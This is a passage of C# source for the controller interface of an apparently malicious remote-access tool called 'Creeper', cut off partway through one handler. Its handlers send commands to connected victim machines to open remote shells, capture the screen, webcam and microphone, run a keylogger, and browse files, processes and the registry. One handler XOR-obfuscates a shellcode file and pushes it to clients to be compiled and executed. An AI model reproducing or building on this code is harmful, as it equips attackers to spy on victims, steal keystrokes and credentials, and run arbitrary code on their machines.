using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Creeper.Controls;
using Creeper.Properties;
using Creeper.singleForms;
using Creeper.TCPSocket;
using MessagePack;
using Microsoft.VisualBasic;

namespace Creeper.ChildForms
{
    public partial class childFormHome : Form
    {
        private ListViewColumnSorter lvwColumnSorter;

        public childFormHome()
        {
            InitializeComponent();
            SetTheme();
        }

        private bool previoustheme;

        private void updateUI_Tick(object sender, EventArgs e)
        {
            if (previoustheme != Settings.Default.darkTheme)
            {
                previoustheme = Settings.Default.darkTheme;
                SetTheme();
            }
        }

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            toolStripMain.BackColor = colorSide;
            toolStripMain.ForeColor = colorText;
            toolStripButtoncamera.Image = darkTheme ? Resources.webcam : Resources.webcam_dark;
            toolStripButtoncmd.Image = darkTheme ? Resources.cmd : Resources.cmd_dark;
            toolStripButtondetails.Image = darkTheme ? Resources.detaillist : Resources.detaillist_dark;
            toolStripButtondevice.Image = darkTheme ? Resources.device : Resources.device_dark;
            toolStripButtonfile.Image = darkTheme ? Resources.file : Resources.file_dark;
            toolStripButtonicon.Image = darkTheme ? Resources.iconlist : Resources.iconlist_dark;
            toolStripButtonnetwork.Image = darkTheme ? Resources.network : Resources.network_dark;
            toolStripButtonpowershell.Image = darkTheme ? Resources.powershell : Resources.powershell_dark;
            toolStripButtonprocess.Image = darkTheme ? Resources.process : Resources.process_dark;
            toolStripButtonscreen.Image = darkTheme ? Resources.screen : Resources.screen_dark;
            toolStripButtonregedit.Image = darkTheme ? Resources.registry : Resources.registry_dark;
            toolStripButtonvoice.Image = darkTheme ? Resources.voice : Resources.voice_dark;
            toolStripButtonkeylogger.Image = darkTheme ? Resources.keylogger : Resources.keylogger_dark;
            listViewHome.BackColor = darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
            listViewHome.ForeColor =
                darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
            listViewHome.Update();
            listViewHome.Refresh();
            foreach (ListViewItem item in listViewHome.Items)
                if (listViewHome.Tag != item)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }
        }

        public void AppandLog(string message)
        {
            this.Invoke((MethodInvoker)(() =>
            {
                richTextBoxlog.AppendText("Creeper >> " + message + "\n");
            }));
        }

        private void toolStripButtonfile_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var file = (singleFormFile)Application.OpenForms["file:" + listViewItem.SubItems[3].Text];
                if (file == null)
                {
                    file = new singleFormFile
                    {
                        Name = "file:" + listViewItem.SubItems[3].Text,
                        Text = "file:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    file.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getDrivers";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Remote File Manager for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private void toolStripButtonscreen_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var formScreen =
                        (singleFormScreen)Application.OpenForms["desktop:" + listViewItem.SubItems[3].Text];
                if (formScreen == null)
                {
                    formScreen = new singleFormScreen
                    {
                        Name = "desktop:" + listViewItem.SubItems[3].Text,
                        Text = "desktop:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    formScreen.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "capture";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;
                    pack.ForcePathObject("Quality").AsInteger = 30;
                    pack.ForcePathObject("Screen").AsInteger = 0;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Screen for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private void toolStripButtoncamera_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var formCamera =
                        (singleFormCamera)Application.OpenForms["webcam:" + listViewItem.SubItems[3].Text];
                if (formCamera == null)
                {
                    formCamera = new singleFormCamera
                    {
                        Name = "webcam:" + listViewItem.SubItems[3].Text,
                        Text = "webcam:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    formCamera.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "webcamGet";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Camera for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private void toolStripButtoncmd_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var shell = (singleFormCmd)Application.OpenForms["shell:" + listViewItem.SubItems[3].Text];
                if (shell == null)
                {
                    shell = new singleFormCmd
                    {
                        Name = "shell:" + listViewItem.SubItems[3].Text,
                        Text = "shell:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    shell.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "shell";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Cmd for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private void toolStripButtonpowershell_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var shell = (singleFormPowershell)Application.OpenForms[
                        "powershell:" + listViewItem.SubItems[3].Text];
                if (shell == null)
                {
                    shell = new singleFormPowershell
                    {
                        Name = "powershell:" + listViewItem.SubItems[3].Text,
                        Text = "powershell:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    shell.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "powershell";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Shell for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private void toolStripButtonprocess_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var process = (singleFormProcess)Application.OpenForms["process:" + listViewItem.SubItems[3].Text];
                if (process == null)
                {
                    process = new singleFormProcess
                    {
                        Name = "process:" + listViewItem.SubItems[3].Text,
                        Text = "process:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    process.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "process";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Process Manager for [{listViewItem.SubItems[3].Text}]...");
                }
            }
        }

        private ListViewItem lvHoveredItem;

        private void listViewHome_MouseMove(object sender, MouseEventArgs e)
        {
            var oItemColor = Settings.Default.darkTheme ? ColorTranslator.FromHtml("#2D333B") : Color.Lavender;
            var oOriginalColor = Settings.Default.darkTheme
                ? Settings.Default.colorlistviewdark
                : Settings.Default.colorlistview;

            var lvCurrentItem = listViewHome.GetItemAt(e.X, e.Y);


            if (lvCurrentItem != null && lvCurrentItem != lvHoveredItem)
            {
                if (lvCurrentItem != listViewHome.Tag)
                {
                    lvCurrentItem.BackColor = oItemColor;

                    if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                        lvHoveredItem.BackColor = oOriginalColor;

                    lvHoveredItem = lvCurrentItem;
                    return;
                }

                if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                    lvHoveredItem.BackColor = oOriginalColor;

                lvHoveredItem = lvCurrentItem;
                return;
            }


            if (lvCurrentItem == null)
                if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                {
                    lvHoveredItem.BackColor = oOriginalColor;
                    lvHoveredItem = null;
                }
        }

        private void toolStripButtondetails_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = true;
            toolStripButtondetails.Enabled = false;
            listViewHome.View = View.Details;
            foreach (ListViewItem item in listViewHome.Items)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "thumbnailStop";
                pack.ForcePathObject("TargetClient").AsString = item.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void toolStripButtonicon_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = false;
            toolStripButtondetails.Enabled = true;
            listViewHome.View = View.LargeIcon;
            if (listViewHome.Items.Count == 0) return;

            foreach (ListViewItem item in listViewHome.Items)
            {
                item.ImageIndex = 0;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "thumbnail";
                pack.ForcePathObject("TargetClient").AsString = item.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void listViewHome_SelectedIndexChanged(object sender, EventArgs e)
        {
            return;
            if (listViewHome.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }

                foreach (ListViewItem item in listViewHome.SelectedItems)
                {
                    //item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                    item.ForeColor = Color.White;
                    item.BackColor = Settings.Default.darkTheme
                        ? ColorTranslator.FromHtml("#5D4529")
                        : ColorTranslator.FromHtml("#758B98");
                }

                listViewHome.Tag = listViewHome.FocusedItem;
                listViewHome.FocusedItem.Selected = false;
            }
        }

        private void listViewHome_MouseLeave(object sender, EventArgs e)
        {
            if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                lvHoveredItem.BackColor = Settings.Default.darkTheme
                    ? Settings.Default.colorlistviewdark
                    : Settings.Default.colorlistview;
            lvHoveredItem = null;
        }

        private void listViewHome_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right) return;
            if (listViewHome.SelectedIndices.Count == 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }

                listViewHome.Tag = null;
            }
        }

        private void loadShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void toolStripButtonnetwork_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var network = (singleFormNetwork)Application.OpenForms["network:" + listViewItem.SubItems[3].Text];
                if (network == null)
                {
                    network = new singleFormNetwork
                    {
                        Name = "network:" + listViewItem.SubItems[3].Text,
                        Text = "network:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    network.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "network";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void toolStripButtondevice_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var device = (singleFormDevice)Application.OpenForms["device:" + listViewItem.SubItems[3].Text];
                if (device == null)
                {
                    device = new singleFormDevice
                    {
                        Name = "device:" + listViewItem.SubItems[3].Text,
                        Text = "device:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    device.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "device";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void childFormHome_Load(object sender, EventArgs e)
        {
            Optimization.EnableListviewDoubleBuffer(listViewHome);
            lvwColumnSorter = new ListViewColumnSorter();
            listViewHome.ListViewItemSorter = lvwColumnSorter;
        }

        private void listViewHome_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            try
            {
                listViewHome.Sort();
            }
            catch
            {
            }
        }

        private void listViewHome_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            int tColumnCount;
            var tRect = new Rectangle();
            var tPoint = new Point();
            var tFont = new Font("Segoe UI", 9, FontStyle.Regular);
            var tBackBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colorlistviewdark
                : Settings.Default.colorlistview);
            SolidBrush tFtontBrush;
            tFtontBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colortextdark
                : Settings.Default.colortext);
            if (listViewHome.Columns.Count == 0) return;

            tColumnCount = listViewHome.Columns.Count;
            tRect.Y = 0;
            tRect.Height = e.Bounds.Height - 1;
            tPoint.Y = 3;
            for (var i = 0; i < tColumnCount; i++)
            {
                if (i == 0)
                {
                    tRect.X = 0;
                    tRect.Width = listViewHome.Columns[i].Width;
                }
                else
                {
                    tRect.X += tRect.Width;
                    tRect.X += 1;
                    tRect.Width = listViewHome.Columns[i].Width - 1;
                }

                e.Graphics.FillRectangle(tBackBrush, tRect);
                tPoint.X = tRect.X + 3;
                e.Graphics.DrawString(listViewHome.Columns[i].Text, tFont, tFtontBrush, tPoint);
            }
        }

        private void toolStripButtonregedit_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var singleFormRegistry =
                        (singleFormRegistry)Application.OpenForms["regedit:" + listViewItem.SubItems[3].Text];
                if (singleFormRegistry == null)
                {
                    singleFormRegistry = new singleFormRegistry
                    {
                        Name = "regedit:" + listViewItem.SubItems[3].Text,
                        Text = "regedit:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    singleFormRegistry.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "LoadRegistryKey";
                    pack.ForcePathObject("RootKeyName").AsString = "";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void toolStripButtonvoice_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var singleFormVoice =
                    (singleFormVoice)Application.OpenForms["voice:" + listViewItem.SubItems[3].Text];
                if (singleFormVoice == null)
                {
                    singleFormVoice = new singleFormVoice
                    {
                        Name = "voice:" + listViewItem.SubItems[3].Text,
                        Text = "voice:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    singleFormVoice.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "voice";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void toolStripButtonkeylogger_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var singleFormKeyLogger =
                        (singleFormKeyLogger)Application.OpenForms["keylogger:" + listViewItem.SubItems[3].Text];
                if (singleFormKeyLogger == null)
                {
                    singleFormKeyLogger = new singleFormKeyLogger
                    {
                        Name = "keylogger:" + listViewItem.SubItems[3].Text,
                        Text = "keylogger:" + listViewItem.SubItems[3].Text,
                        HWID = listViewItem.SubItems[3].Text
                    };
                    singleFormKeyLogger.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "keylogger";
                    pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void codedomToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var singleFormCodeDom = new singleFormCodeDom
                {
                    Name = "codedom:" + hwid,
                    Text = "codedom:" + hwid,
                    HWID = hwid
                };
                singleFormCodeDom.Show();
            }
        }

        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Multiselect = false;
                openFileDialog.Filter = "(*.bin)|*.bin";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var shellcode = File.ReadAllBytes(openFileDialog.FileName);
                    var xorkey = Guid.NewGuid().GetHashCode().ToString();
                    var xor = Helper.Helper.Xor(shellcode, xorkey);
                    var source = Resources.Run_Shellcode.Replace("%XORKEY%", xorkey)
                        .Replace("%PAYLOAD%", Convert.ToBase64String(xor));

                    foreach (ListViewItem item in listViewHome.SelectedItems)
                    {
                        string hwid = item.SubItems[3].Text;
                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "codedom";
                        pack.ForcePathObject("TargetClient").AsString = hwid;
                        pack.ForcePathObject("Source").AsString = source;
                        pack.ForcePathObject("References").AsString = "System.dll";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                        AppandLog($"Sent Shellcode to Clients [{hwid}]");
                    }
                }
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var singleFormKeyLogger = (singleFormKeyLogger)Application.OpenForms["keylogger:" + hwid];
                if (singleFormKeyLogger == null)
                {
                    singleFormKeyLogger = new singleFormKeyLogger
                    {
                        Name = "keylogger:" + hwid,
                        Text = "keylogger:" + hwid,
                        HWID = hwid
                    };
                    singleFormKeyLogger.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "keylogger";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened KeyLogger for [{hwid}]");
                }
            }
        }

        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var shell = (singleFormCmd)Application.OpenForms["shell:" + hwid];
                if (shell == null)
                {
                    shell = new singleFormCmd
                    {
                        Name = "shell:" + hwid,
                        Text = "shell:" + hwid,
                        HWID = hwid
                    };
                    shell.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "shell";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Open Cmd on [{hwid}]...");
                }
            }
        }

        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var shell = (singleFormPowershell)Application.OpenForms["powershell:" + hwid];
                if (shell == null)
                {
                    shell = new singleFormPowershell
                    {
                        Name = "powershell:" + hwid,
                        Text = "powershell:" + hwid,
                        HWID = hwid
                    };
                    shell.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "powershell";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Open Powershell on [{hwid}]...");
                }
            }
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var formScreen = (singleFormScreen)Application.OpenForms["desktop:" + hwid];
                if (formScreen == null)
                {
                    formScreen = new singleFormScreen
                    {
                        Name = "desktop:" + hwid,
                        Text = "desktop:" + hwid,
                        HWID = hwid
                    };
                    formScreen.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "capture";
                    pack.ForcePathObject("TargetClient").AsString = hwid;
                    pack.ForcePathObject("Quality").AsInteger = 30;
                    pack.ForcePathObject("Screen").AsInteger = 0;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Desktop Tool For [{hwid}]...");
                }
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var formCamera = (singleFormCamera)Application.OpenForms["webcam:" + hwid];
                if (formCamera == null)
                {
                    formCamera = new singleFormCamera
                    {
                        Name = "webcam:" + hwid,
                        Text = "webcam:" + hwid,
                        HWID = hwid
                    };
                    formCamera.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "webcamGet";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Camera On [{hwid}]...");
                }
            }
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var file = (singleFormFile)Application.OpenForms["file:" + hwid];
                if (file == null)
                {
                    file = new singleFormFile
                    {
                        Name = "file:" + hwid,
                        Text = "file:" + hwid,
                        HWID = hwid
                    };
                    file.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getDrivers";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened File Tool on [{hwid}]...");
                }
            }
        }

        private void processToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var process = (singleFormProcess)Application.OpenForms["process:" + hwid];
                if (process == null)
                {
                    process = new singleFormProcess
                    {
                        Name = "process:" + hwid,
                        Text = "process:" + hwid,
                        HWID = hwid
                    };
                    process.Show();

                    var pack = new MsgPack();
